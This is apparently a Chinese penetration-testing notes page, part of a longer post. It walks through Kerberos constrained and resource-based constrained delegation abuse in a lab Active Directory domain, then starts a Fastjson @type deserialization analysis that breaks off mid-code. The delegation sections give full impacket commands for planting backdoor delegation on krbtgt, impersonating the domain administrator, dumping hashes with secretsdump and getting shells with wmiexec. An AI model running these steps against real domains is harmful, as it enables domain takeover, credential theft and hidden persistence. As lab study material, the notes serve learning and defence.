<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231007220756334.png" alt="image-20231007220756334" style="zoom:80%;" />

<h4 id="利用（后门）"><a href="#利用（后门）" class="headerlink" title="利用（后门）"></a>利用（后门）</h4><p>约束委派可以作为变种黄金票据，用作后门权限维持。<br>给后门账户[知道密码或是hash就成]注册SPN:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -U -A yueshu1_test/win71 yueshu1</span><br></pre></td></tr></table></figure>

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231010110856007.png" alt="image-20231010110856007" style="zoom:67%;" />

<p>配置后门账户到域控的约束委派：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查找所有委派设置</span></span><br><span class="line">findDelegation.py -dc-ip 192.168.1.250 -target-domain y5neko.com y5neko.com/user1:win71@123</span><br></pre></td></tr></table></figure>

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231010111137466.png" alt="image-20231010111137466" style="zoom:67%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231010112212296.png" alt="image-20231010112212296" style="zoom:80%;" />

<p>使用impactet工具包中的getST.py模拟域管理员administrator账号申请访问域控的ldap服务的ST。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getST.py -dc-ip 192.168.1.250 -spn ldap/DC.y5neko.com -impersonate administrator y5neko.com/yueshu1 -hashes 00000000000000000000000000000000:1851fad1b3b4fb0dbad79a832a42d7d3 		<span class="comment">#LMhash可以用32位0填充</span></span><br></pre></td></tr></table></figure>

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231010165954840.png" alt="image-20231010165954840" style="zoom: 67%;" />

<p><img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231010165913130.png" alt="image-20231010165913130"></p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231010170018341.png" alt="image-20231010170018341" style="zoom: 80%;" />

<p>ptt横向，然后wmiexec到域控获取权限，或是secretsdump后随时随地pth域控</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=administrator.ccache</span><br><span class="line">klist</span><br><span class="line">wmiexec.py -dc-ip 192.168.1.250 -no-pass -k administrator@dc.y5neko.com</span><br></pre></td></tr></table></figure>

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231010170230704.png" alt="image-20231010170230704" style="zoom:80%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231010170423240.png" alt="image-20231010170423240" style="zoom:80%;" />

<p>secretdump哈希值</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py -k -no-pass dc.y5neko.com -just-dc-user administrator</span><br><span class="line">wmiexec.py y5neko/administrator@192.168.1.250  -hashes aad3b435b51404eeaad3b435b51404ee:7667ec0e5d9f6ed3802e427cf4aa1048</span><br></pre></td></tr></table></figure>

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231010170822805.png" alt="image-20231010170822805" style="zoom:80%;" />

<h4 id="利用（横向）"><a href="#利用（横向）" class="headerlink" title="利用（横向）"></a>利用（横向）</h4><p>打下配置了约束委派的服务账号，我们就可以拿下被配置的约束委派的服务(A-&gt;B)。<br>和上述利用方式一致：用A账号getST模拟administrator获取访问B的ST，ptt，wmiexec。</p>
<h3 id="基于资源的约束委派"><a href="#基于资源的约束委派" class="headerlink" title="基于资源的约束委派"></a>基于资源的约束委派</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>基于资源的约束性委派 (<strong>RBCD</strong>：Resource Based Constrained Delegation)：为了使⽤户&#x2F;资源更加独⽴，微软在Windows Server 2012中引⼊了基于资源的约束性委派。基于资源的约束委派<strong>不需要域管理员权限</strong>去设置，⽽把设置属性的权限赋予给了机器⾃身。</p>
<p>配置了基于资源约束委派的账户，其中有一个属性 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> ，它的值为被允许基于资源约束性委派的账号的SID。</p>
<p>只有 Windows Server 2012 和 Windows Server 2012 R2 及以上的域控制器才有 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 这个属性</p>
<p>在大型域环境中，将机器加入到域环境中一般不会用域管权限，而是用一个专门加域的域用户（例如下边实验中的test的用户）。那么当我们拿下该域用户的账号密码时，就可以把通过该域用户加入到域里的所有机器都拿下。</p>
<h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>配置约束委派，必须拥有<code>SeEnableDelegation</code>特权，该特权很敏感，通常仅授予域管理员。为了使用户&#x2F;资源更加独立，Windows Server 2012中引入了基于资源的约束委派。<br>传统的约束委派是”正向的”，通过将service2的SPN添加到service1的<code>msDS-AllowedToDelegateTo</code>属性中，并且配置service1的<code>TrustedToAuthenticationForDelegation</code>属性为true。传统的约束委派S4U2self返回的票据一定是可转发的，如果不可转发那么S4U2proxy将失败；但是基于资源的约束委派不同，就算S4U2self返回的票据不可转发，S4U2proxy也是可以成功，并且S4U2proxy返回的票据总是可转发。<br>同时基于资源的约束委派(RBCD)配置则是相反的，通过将service1的SID添加到service2的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性中，就可以达到相同目的。<br>基于资源的约束委派具有传统的约束委派的所有安全问题，因为我们只需要拥有修改<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性的权限，所以RBCD的利用比较于传统的约束委派场景多也简单。<br>默认情况下以下账户拥有修改<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性的权限：</p>
<ul>
<li><strong>Domain Admins</strong>(域管理员)</li>
<li><strong>mS-DS-CreatorSID</strong>(将该机器加入域的账户)</li>
<li><strong>NT AUTHORITY\SELF</strong>(机器账户本身)</li>
</ul>
<p>RBCD的利用条件：</p>
<ul>
<li>能修改<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性的权限</li>
<li>一个具有SPN的账户的TGT</li>
</ul>
<h4 id="利用（后门）-1"><a href="#利用（后门）-1" class="headerlink" title="利用（后门）"></a>利用（后门）</h4><p>首先注册资源约束服务</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -U -A ziyuanyueshu_test/win71 ziyuanyueshu</span><br></pre></td></tr></table></figure>

<p><img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231011154951891.png" alt="image-20231011154951891"></p>
<p>需要域管理员权限，修改krbtgt或是域控的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性，加入已知后门账户的SID。**<code>Domain Admins</code>**<br>使用ActiveDirectory模块，域控2012及以上默认安装。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount ziyuanyueshu</span><br><span class="line">Get-ADUser krbtgt -Properties PrincipalsAllowedToDelegateToAccount</span><br></pre></td></tr></table></figure>

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231010175029335.png" alt="image-20231010175029335" style="zoom:67%;" />

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getST.py -dc-ip 192.168.1.250 -spn krbtgt -impersonate administrator y5neko.com/ziyuanyueshu:ziyuanyueshu@123</span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=administrator.ccache</span><br><span class="line">wmiexec.py -dc-ip 192.168.1.250 -no-pass -k administrator@dc.y5neko.com</span><br></pre></td></tr></table></figure>

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231011160140642.png" alt="image-20231011160140642" style="zoom: 80%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231011160443492.png" alt="image-20231011160443492" style="zoom:80%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231011160512927.png" alt="image-20231011160512927" style="zoom:80%;" />

<h4 id="利用（横向）-1"><a href="#利用（横向）-1" class="headerlink" title="利用（横向）"></a>利用（横向）</h4><p>A配置了到B的RBCD，打下A就可以打下B。**<code>和约束委派横向利用场景一致</code>**<br>某公司有专门加域的域用户A或是其有添加过多台机器入域，获取该账户的权限后，可利用基于资源的约束委派修改机器属性，批量获取机器权限。**<code>mS-DS-CreatorSID</code>**<br>如果我们想拿域内机器A的权限，如果我们又没有机器A的administrators组成员凭据的话还可以看机器A是通过哪个用户加入域的，控制了这个用户A依然可以获取权限。**<code>mS-DS-CreatorSID</code>**<br>如何查找类似的用户，非域管加域机器才会有<code>mS-DS-CreatorSID</code>属性：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b <span class="string">&quot;DC=y5neko,DC=com&quot;</span> -f <span class="string">&quot;(&amp;(samAccountType=805306369))&quot;</span> cn mS-DS-CreatorSID</span><br><span class="line"><span class="comment">#因为只有一台机器，我这里其实就是user1用户</span></span><br><span class="line">AdFind.exe -b <span class="string">&quot;DC=y5neko,DC=com&quot;</span> -f <span class="string">&quot;(&amp;(objectsid=S-1-5-21-1493762544-529832293-733686757-1112))&quot;</span> objectclass cn dn</span><br></pre></td></tr></table></figure>

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231011161516529.png" alt="image-20231011161516529" style="zoom:80%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231011161701438.png" alt="image-20231011161701438" style="zoom:80%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231011165957286.png" alt="image-20231011165957286" style="zoom:80%;" />

<p>假设这个user1是专门加域用的账户，我们通过一定手段拿到了密码，然后添加机器账号，设置ziyuanyueshu1到WIN71的RBCD</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">addcomputer.py -dc-ip 192.168.1.250 -computer-name <span class="string">&#x27;ziyuanyueshu1$&#x27;</span> -computer-pass ziyuanyueshu1@123 y5neko.com/user1:win71@123</span><br><span class="line"><span class="comment">#2021版本</span></span><br><span class="line">rbcd.py -f ziyuanyueshu1 -t WIN71 -dc-ip 192.168.1.250 y5neko\\ziyuanyueshu:ziyuanyueshu\@123</span><br><span class="line"><span class="comment">#新版本</span></span><br><span class="line">rbcd.py -delegate-to WIN71$ -delegate-from ziyuanyueshu1$ -dc-ip 192.168.1.250 y5neko/ziyuanyueshu:ziyuanyueshu@123 -action write</span><br></pre></td></tr></table></figure>

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231011172259024.png" alt="image-20231011172259024" style="zoom:80%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231011172438459.png" alt="image-20231011172438459" style="zoom:80%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231011213936700.png" alt="image-20231011213936700" style="zoom: 67%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231011220818453.png" alt="image-20231011220818453" style="zoom:80%;" />

<p>模拟域管理员administrator账号申请访问win7的ST，ptt，然后wmiexec到目标主机:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getST.py -spn cifs/win71.y5neko.com -impersonate administrator -dc-ip 192.168.1.250 y5neko.com/ziyuanyueshu1$:ziyuanyueshu1@123</span><br><span class="line">wmiexec.py -dc-ip 192.168.1.250 -no-pass -k administrator@win71.y5neko.com</span><br></pre></td></tr></table></figure>

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231016170144548.png" alt="image-20231016170144548" style="zoom:80%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231016172303620.png" alt="image-20231016172303620" style="zoom:80%;" />

<blockquote>
<p>我在第一次测试的时候wmiexec出现报错0x800706ba</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231016172836543.png" alt="image-20231016172836543" style="zoom:80%;" />

<p>后来查了一下发现是防火墙的报错，关闭即可</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231016173047897.png" alt="image-20231016173047897" style="zoom:80%;" />
</blockquote>
<h4 id="利用（提权）"><a href="#利用（提权）" class="headerlink" title="利用（提权）"></a>利用（提权）</h4><h1 id="常见漏洞利用"><a href="#常见漏洞利用" class="headerlink" title="常见漏洞利用"></a>常见漏洞利用</h1><h2 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h2><h3 id="T3协议反序列化CVE-2015-4852"><a href="#T3协议反序列化CVE-2015-4852" class="headerlink" title="T3协议反序列化CVE-2015-4852"></a>T3协议反序列化CVE-2015-4852</h3><h2 id="FastJson"><a href="#FastJson" class="headerlink" title="FastJson"></a>FastJson</h2><h3 id="正常解析"><a href="#正常解析" class="headerlink" title="正常解析"></a>正常解析</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.fastjson;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;param1\&quot;:\&quot;test1\&quot;,\&quot;param2\&quot;:\&quot;test2\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSON.parseObject(s);</span><br><span class="line">        System.out.println(jsonObject);</span><br><span class="line">        System.out.println(jsonObject.getString(<span class="string">&quot;param1&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231018160435725.png" alt="image-20231018160435725" style="zoom:80%;" />

<h3 id="指定解析类型为对象"><a href="#指定解析类型为对象" class="headerlink" title="指定解析类型为对象"></a>指定解析类型为对象</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span></span><br><span class="line"><span class="comment"> * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.</span></span><br><span class="line"><span class="comment"> * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.</span></span><br><span class="line"><span class="comment"> * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.</span></span><br><span class="line"><span class="comment"> * Vestibulum commodo. Ut rhoncus gravida arcu.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.y5neko.sec.fastjson;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//String s = &quot;&#123;\&quot;param1\&quot;:\&quot;test1\&quot;,\&quot;param2\&quot;:\&quot;test2\&quot;&#125;&quot;;</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;Y5neKO\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="comment">//JSONObject jsonObject = JSON.parseObject(s);</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> JSON.parseObject(s2, Person.class);</span><br><span class="line">        <span class="comment">//System.out.println(jsonObject);</span></span><br><span class="line">        <span class="comment">//System.out.println(jsonObject.getString(&quot;param1&quot;));</span></span><br><span class="line">        System.out.println(<span class="string">&quot;------------&quot;</span>);</span><br><span class="line">        System.out.println(person.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231018161304671.png" alt="image-20231018161304671" style="zoom:80%;" />

<h3 id="根据字符串反序列化任意类"><a href="#根据字符串反序列化任意类" class="headerlink" title="根据字符串反序列化任意类"></a>根据字符串反序列化任意类</h3><ul>
<li>上面是通过操作对应类，从而在类中进行字符串JSON解析生成对象，那如果字符串中前面加了@type，我们可以发现，@type对应的键值是可以直接解析指定的类的，我们可以发现通过传入不同的字符，可以执行不同的代码，这里就相当危险了。</li>
<li>至于为什么要引入这个type，我们这里举一个不是很恰当的例子：</li>
<li>现在有材料的衣服，一种是布料，一种是速干料，但是两种衣服外表是一样的，在生产过程的标签中（序列化过程），如果不加衣服的材料，在出厂反序列化的过程就会分不清，这样的话就会产生歧义，而如果加上材料，就相当于加上了@type这样的话，我们就可以分清楚衣服的材料对应哪一个衣服，但是又因为@type客户端可控，速干料的衣服就可以被贴上布料的标签，然后以便宜的价格去买到。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span></span><br><span class="line"><span class="comment"> * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.</span></span><br><span class="line"><span class="comment"> * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.</span></span><br><span class="line"><span class="comment"> * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.</span></span><br><span class="line"><span class="comment"> * Vestibulum commodo. Ut rhoncus gravida arcu.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.y5neko.sec.fastjson;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//        String s = &quot;&#123;\&quot;param1\&quot;:\&quot;test1\&quot;,\&quot;param2\&quot;:\&quot;test2\&quot;&#125;&quot;;</span></span><br><span class="line"><span class="comment">//        String s2 = &quot;&#123;\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;Y5neKO\&quot;&#125;&quot;;</span></span><br><span class="line"><span class="comment">//        JSONObject jsonObject = JSON.parseObject(s);</span></span><br><span class="line"><span class="comment">//        Person person = JSON.parseObject(s2, Person.class);</span></span><br><span class="line"><span class="comment">//        System.out.println(jsonObject);</span></span><br><span class="line"><span class="comment">//        System.out.println(jsonObject.getString(&quot;param1&quot;));</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;------------&quot;);</span></span><br><span class="line"><span class="comment">//        System.out.println(person.getName());</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s3</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.y5neko.sec.fastjson.Person\&quot;,\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;abc\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSON.parseObject(s3);</span><br><span class="line">        System.out.println(<span class="string">&quot;------------&quot;</span>);</span><br><span class="line">        System.out.println(jsonObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231018162326072.png" alt="image-20231018162326072" style="zoom:80%;" />

<p>可以看到通过解析字符串，最后对Person里面的类进行了解析实例化赋值调用操作，赋值要不就是反射赋值，要不就是set函数去改，我们可以发现这里是通过调用了Person里面的set函数去进行的赋值。</p>
<p>我们在parsePbject方法下个断点分析一下</p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231018163645182.png" alt="image-20231018163645182" style="zoom:80%;" />

<p>后面几行就是转一个JSONObject，我们直接跟进parse方法</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231018164553666.png" alt="image-20231018164553666" style="zoom:80%;" />

<p>这里调用了DefaultJSONParser类对传入字符串进行解析，一般情况下都是调用这个，接下来调用DefaultJSONParser对象中的parse方法</p>
<p>主要分为两个阶段，一个是对字符串形式的判断，是否为json形式，一个是对key和value的获取，先获取key的值，再获取value的值。</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231018181939302.png" alt="image-20231018181939302" style="zoom:80%;" />



<p>跟进到parse的第二个构造方法，这里是一段switch语句获取token来判断json格式，当开头为 { 时token为12，则进入到LBRACE分支</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231018182323639.png" alt="image-20231018182323639" style="zoom:80%;" />

<p>跟进到parseObject方法，在这里实现获取key的操作，这里我们获取到的是@type</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231018183701961.png" alt="image-20231018183701961" style="zoom:80%;" />

<p>而默认的DEFAULT_TYPE_KEY就是@type，就是获取key以后会做一个特殊的调整，表示应该做java反序列化还是单纯的json反序列化，这里匹配到@type，所以后续要Java反序列化</p>
<p>我们可以看到对类进行了<strong>loadClass</strong>加载，然后后面我们就要按照Java的逻辑来进行反序列化操作，这里第一步就是获取了反序列化器，然后用反序列化器进行反序列化操作</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231018184737838.png" alt="image-20231018184737838" style="zoom:80%;" />

<p>我们重点对反序列化过程进行分析，这里在创建反序列化器的时候需要先获取类里面的内容，跟进到config类</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231018192655141.png" alt="image-20231018192655141" style="zoom:80%;" />

<p>我们可以看到大概在这里有一个判断反序列化类内容的过程，如果不属于上面的几种类型，则通过JavaBean来解析类，继续跟进createJavaBeanDeserializer方法</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231018194119002.png" alt="image-20231018194119002" style="zoom:80%;" />

<p>首先检查asm是否启用，如果启用则进入asm过程</p>
<blockquote>
<p>ASM是一种高性能的JSON序列化和反序列化技术，它通过在运行时动态选择合适的方法来处理JSON数据，以提高性能。默认情况下，Fastjson会根据系统环境决定是否启用ASM。</p>
<p>如果<code>asmEnable</code>为<code>true</code>，则启用ASM，这可以在序列化和反序列化JSON时提供更好的性能。如果<code>asmEnable</code>为<code>false</code>，则禁用ASM，这将使用默认的序列化和反序列化方法。</p>
<p>请注意，<code>asmEnable</code>是Fastjson内部的一个设置，通常不需要用户手动配置。Fastjson会根据系统环境自动进行判断和设置。</p>
</blockquote>
<p>其中用于获取类内容是通过<code>JavaBeanInfo.build</code>函数，跟进到build函数</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231018200230560.png" alt="image-20231018200230560" style="zoom:80%;" />

<p>分析发现build函数的整个逻辑，先遍历了一遍method（set），然后遍历了一遍public fields，然后又遍历了一遍method（get）</p>
<p>满足set的条件如下</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231018202332820.png" alt="image-20231018202332820" style="zoom:80%;" />

<p>满足get的条件如下</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231018203154904.png" alt="image-20231018203154904" style="zoom:80%;" />

<p>最后再返回JavaBeanInfo对象</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231018201330344.png" alt="image-20231018201330344" style="zoom:80%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231018201438438.png" alt="image-20231018201438438" style="zoom:80%;" />

<h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>接下来我们分析一下fastjson的漏洞链</p>
<p>通过上面的分析我们知道，在反序列化时，parse触发了set方法，parseObject同时触发了set和get方法，由于存在这种<code>autoType</code>特性。如果<code>@type</code>标识的类中的setter或getter方法存在恶意代码，那么就有可能存在fastjson反序列化漏洞。</p>
<p>Fastjson 序列化对象的方法主要是<code>toJSONString</code> 方法，而反序列化还原对象的方法有3个</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">parse(String text);</span><br><span class="line">parseObject(Srting text, Class\clazz);</span><br><span class="line">parseObject(String text);</span><br></pre></td></tr></table></figure>

<p>我们来看看三种方法返回的类型：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span></span><br><span class="line"><span class="comment"> * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.</span></span><br><span class="line"><span class="comment"> * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.</span></span><br><span class="line"><span class="comment"> * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.</span></span><br><span class="line"><span class="comment"> * Vestibulum commodo. Ut rhoncus gravida arcu.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.y5neko.sec.fastjson;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//        String s = &quot;&#123;\&quot;param1\&quot;:\&quot;test1\&quot;,\&quot;param2\&quot;:\&quot;test2\&quot;&#125;&quot;;</span></span><br><span class="line"><span class="comment">//        String s2 = &quot;&#123;\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;Y5neKO\&quot;&#125;&quot;;</span></span><br><span class="line"><span class="comment">//        JSONObject jsonObject = JSON.parseObject(s);</span></span><br><span class="line"><span class="comment">//        Person person = JSON.parseObject(s2, Person.class);</span></span><br><span class="line"><span class="comment">//        System.out.println(jsonObject);</span></span><br><span class="line"><span class="comment">//        